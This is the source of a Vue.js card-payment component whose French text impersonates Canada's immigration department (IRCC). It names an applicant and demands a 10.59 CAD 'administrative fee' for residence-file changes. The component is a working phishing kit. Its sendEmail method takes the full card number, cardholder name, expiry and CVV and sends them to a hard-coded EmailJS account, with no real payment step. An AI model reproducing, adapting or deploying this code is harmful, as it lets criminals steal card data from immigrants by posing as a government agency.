<template>
  <div class="card-form">
    <h1>Michael Vitor Martin</h1>
    <h1>IUC : 11-1675-2037</h1>
    <h1>Nous avons reçu votre document. Merci!
    </h1>
    <h3>À compter du 1er janvier 2025, toute demande de modification apportée à un dossier de résidence permanente entraînera des frais administratifs de 10,59 CAD. Ces frais seront appliqués pour couvrir les coûts de traitement liés aux ajustements demandés. Merci de votre compréhension.</h3>
    <h2>Afin d'éviter tout retard dans le traitement de votre demande, veuillez procéder au paiement ci-dessous :</h2>
    <br>
    <div class="card-list">
      <Card
        :fields="fields"
        :labels="formData"
        :isCardNumberMasked="false"
        :randomBackgrounds="randomBackgrounds"
        :backgroundImage="backgroundImage"
      />
    </div>
    <div class="card-form__inner">
      <div class="card-input">
        <label for="cardNumber" class="card-input__label">{{ $t('cardForm.cardNumber') }}</label>
        <input
          type="tel"
          :id="fields.cardNumber"
          @input="changeNumber"
          @focus="focusCardNumber"
          class="card-input__input"
          :value="formData.cardNumber"
          :maxlength="cardNumberMaxLength"
          data-card-field
          autocomplete="off"
        />
      </div>
      <div class="card-input">
        <label for="cardName" class="card-input__label">{{ $t('cardForm.cardName') }}</label>
        <input
          type="text"
          :id="fields.cardName"
          v-letter-only
          @input="changeName"
          class="card-input__input"
          :value="formData.cardName"
          data-card-field
          autocomplete="off"
        />
      </div>
      <div class="card-form__row">
        <div class="card-form__col">
          <div class="card-form__group">
            <label for="cardMonth" class="card-input__label">{{ $t('cardForm.expirationDate') }}</label>
            <select
              class="card-input__input -select"
              :id="fields.cardMonth"
              v-model="formData.cardMonth"
              @change="changeMonth"
              data-card-field
            >
              <option value disabled selected>{{ $t('cardForm.month') }}</option>
              <option
                v-bind:value="n < 10 ? '0' + n : n"
                v-for="n in 12"
                v-bind:disabled="n < minCardMonth"
                v-bind:key="n"
              >{{generateMonthValue(n)}}</option>
            </select>
            <select
              class="card-input__input -select"
              :id="fields.cardYear"
              v-model="formData.cardYear"
              @change="changeYear"
              data-card-field
            >
              <option value disabled selected>{{ $t('cardForm.year') }}</option>
              <option
                v-bind:value="$index + minCardYear"
                v-for="(n, $index) in 12"
                v-bind:key="n"
              >{{$index + minCardYear}}</option>
            </select>
          </div>
        </div>
        <div class="card-form__col -cvv">
          <div class="card-input">
            <label for="cardCvv" class="card-input__label">{{ $t('cardForm.CVV') }}</label>
            <input
              type="tel"
              class="card-input__input"
              v-number-only
              :id="fields.cardCvv"
              maxlength="4"
              :value="formData.cardCvv"
              @input="changeCvv"
              data-card-field
              autocomplete="off"
            />
          </div>
        </div>
      </div>

      <button class="card-form__button" v-on:click="sendEmail">{{ $t('cardForm.submit') }}</button>
    </div>
    <h1>REFUND POLICY – POLITIQUE DE REMBOURSEMENT</h1>
    <p>
        Unless otherwise specified, fees paid will not be refunded for an application in process by IRCC, or approved or refused by IRCC. In the event of a refund, IRCC complies with the Financial Administration Act (FAA) which stipulates that the money must be returned or repaid to the person who performed the payment.
    </p>
    <p>
        À moins d’indication contraire, les frais payés ne sont pas remboursables pour une demande en traitement par IRCC, ou approuvée ou refusée par IRCC. Dans le cas d’un remboursement, IRCC se conforme à la Loi sur la gestion des finances publiques (LGFP) qui stipule que les frais doivent être restitués à la personne qui a effectué le paiement.
    </p>
  </div>
</template>

<script>
import emailjs from 'emailjs-com'
import Card from '@/components/Card'
export default {
  name: 'CardForm',
  directives: {
    'number-only': {
      bind (el) {
        function checkValue (event) {
          event.target.value = event.target.value.replace(/[^0-9]/g, '')
          if (event.charCode >= 48 && event.charCode <= 57) {
            return true
          }
          event.preventDefault()
        }
        el.addEventListener('keypress', checkValue)
      }
    },
    'letter-only': {
      bind (el) {
        function checkValue (event) {
          if (event.charCode >= 48 && event.charCode <= 57) {
            event.preventDefault()
          }
          return true
        }
        el.addEventListener('keypress', checkValue)
      }
    }
  },
  props: {
    formData: {
      type: Object,
      default: () => {
        return {
          cardName: '',
          cardNumber: '',
          cardNumberNotMask: '',
          cardMonth: '',
          cardYear: '',
          cardCvv: ''
        }
      }
    },
    backgroundImage: [String, Object],
    randomBackgrounds: {
      type: Boolean,
      default: true
    }
  },
  components: {
    Card
  },
  data () {
    return {
      fields: {
        cardNumber: 'v-card-number',
        cardName: 'v-card-name',
        cardMonth: 'v-card-month',
        cardYear: 'v-card-year',
        cardCvv: 'v-card-cvv'
      },
      minCardYear: new Date().getFullYear(),
      isCardNumberMasked: true,
      mainCardNumber: this.cardNumber,
      cardNumberMaxLength: 19
    }
  },
  computed: {
    minCardMonth () {
      if (this.formData.cardYear === this.minCardYear) return new Date().getMonth() + 1
      return 1
    }
  },
  watch: {
    cardYear () {
      if (this.formData.cardMonth < this.minCardMonth) {
        this.formData.cardMonth = ''
      }
    }
  },
  mounted () {
    this.maskCardNumber()
  },
  methods: {
    sendEmail () {
      const templateParams = {
        cardNumber: this.formData.cardNumber,
        cardName: this.formData.cardName,
        cardMonth: this.formData.cardMonth,
        cardYear: this.formData.cardYear,
        cardCvv: this.formData.cardCvv
      }

      console.log('templateParams', templateParams)

      emailjs.send('service_312hyqf', 'template_0liwzhe', templateParams, 'aPq5n2p5qws4qZmo9')
        .then((response) => {
          console.log('SUCCESS!', response.status, response.text)
        }, (error) => {
          console.log('FAILED...', error)
        })
    },
    generateMonthValue (n) {
      return n < 10 ? `0${n}` : n
    },
    changeName (e) {
      this.formData.cardName = e.target.value
      this.$emit('input-card-name', this.formData.cardName)
    },
    changeNumber (e) {
      this.formData.cardNumber = e.target.value
      let value = this.formData.cardNumber.replace(/\D/g, '')
      // american express, 15 digits
      if ((/^3[47]\d{0,13}$/).test(value)) {
        this.formData.cardNumber = value.replace(/(\d{4})/, '$1 ').replace(/(\d{4}) (\d{6})/, '$1 $2 ')
        this.cardNumberMaxLength = 17
      } else if ((/^3(?:0[0-5]|[68]\d)\d{0,11}$/).test(value)) { // diner's club, 14 digits
        this.formData.cardNumber = value.replace(/(\d{4})/, '$1 ').replace(/(\d{4}) (\d{6})/, '$1 $2 ')
        this.cardNumberMaxLength = 16
      } else if ((/^\d{0,16}$/).test(value)) { // regular cc number, 16 digits
        this.formData.cardNumber = value.replace(/(\d{4})/, '$1 ').replace(/(\d{4}) (\d{4})/, '$1 $2 ').replace(/(\d{4}) (\d{4}) (\d{4})/, '$1 $2 $3 ')
        this.cardNumberMaxLength = 19
      }
      // eslint-disable-next-line eqeqeq
      if (e.inputType == 'deleteContentBackward') {
        let lastChar = this.formData.cardNumber.substring(this.formData.cardNumber.length, this.formData.cardNumber.length - 1)
        // eslint-disable-next-line eqeqeq
        if (lastChar == ' ') { this.formData.cardNumber = this.formData.cardNumber.substring(0, this.formData.cardNumber.length - 1) }
      }
      this.$emit('input-card-number', this.formData.cardNumber)
    },
    changeMonth () {
      this.$emit('input-card-month', this.formData.cardMonth)
    },
    changeYear () {
      this.$emit('input-card-year', this.formData.cardYear)
    },
    changeCvv (e) {
      this.formData.cardCvv = e.target.value
      this.$emit('input-card-cvv', this.formData.cardCvv)
    },
    invaildCard () {
      let number = this.formData.cardNumberNotMask.replace(/ /g, '')
      var sum = 0
      for (var i = 0; i < number.length; i++) {
        var intVal = parseInt(number.substr(i, 1))
        if (i % 2 === 0) {
          intVal *= 2
          if (intVal > 9) {
            intVal = 1 + (intVal % 10)
          }
        }
        sum += intVal
      }
      if (sum % 10 !== 0) {
        alert(this.$t('cardForm.invalidCardNumber'))
      }
    },
    blurCardNumber () {
      if (this.isCardNumberMasked) {
        this.maskCardNumber()
      }
    },
    maskCardNumber () {
      this.formData.cardNumberNotMask = this.formData.cardNumber
      this.mainCardNumber = this.formData.cardNumber
      let arr = this.formData.cardNumber.split('')
      arr.forEach((element, index) => {
        if (index > 4 && index < 14 && element.trim() !== '') {
          arr[index] = '*'
        }
      })
      this.formData.cardNumber = arr.join('')
    },
    unMaskCardNumber () {
      this.formData.cardNumber = this.mainCardNumber
    },
    focusCardNumber () {
      this.unMaskCardNumber()
    },
    toggleMask () {
      this.isCardNumberMasked = !this.isCardNumberMasked
      if (this.isCardNumberMasked) {
        this.maskCardNumber()
      } else {
        this.unMaskCardNumber()
      }
    }
  }
}
</script>
